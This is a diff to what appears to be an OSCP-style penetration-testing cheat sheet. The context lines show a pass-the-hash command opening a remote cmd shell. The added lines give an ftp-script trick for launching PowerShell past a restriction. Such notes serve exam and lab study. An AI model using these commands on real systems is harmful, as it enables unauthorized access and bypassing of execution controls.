@@ -139,6 +139,13 @@ Existing tools - PsExec from Metasploit, Passing-the-hash toolkit, and Impacket
 kali@kali:~$ pth-winexe -U offsec%aad3b435b51484eeaad3b435b51484ee:2892d26cdf84d7a78e2eb3b9f05c425e //10.11.0.22 cmd
 ```
 
+* Bypass Powershell restriction
+
+```
+echo !powershell.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
+// https://www.reddit.com/r/oscp/comments/hbjj6p/ftp_trick/
+```
+
 * File Transfer (use BASH ALIAS function for powershell)
 
 ```
